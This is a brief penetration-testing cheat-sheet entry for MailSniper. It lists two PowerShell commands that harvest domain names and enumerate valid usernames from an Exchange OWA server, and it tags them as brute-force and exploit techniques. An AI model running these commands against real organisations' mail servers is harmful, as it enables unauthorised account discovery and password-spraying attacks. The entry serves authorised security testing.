# mailsniper
% exchange
#plateform/windows  #target/remote  #protocol/exchange 


##  Invoke-DomainHarvestOWA
#cat/ATTACK/BRUTEFORCE-SPRAY 
```powershell
Invoke-DomainHarvestOWA -ExchHostname <url> -DomainList <domain list file> -Outfile <output file>
```

## user enumeration
#cat/ATTACK/EXPLOIT 
```powershell
Invoke-UsernameHarvestOWA –UserList .\username_list.txt –ExchHostname <fqdn> –Domain <domain> –OutFile potential_usernames.txt
```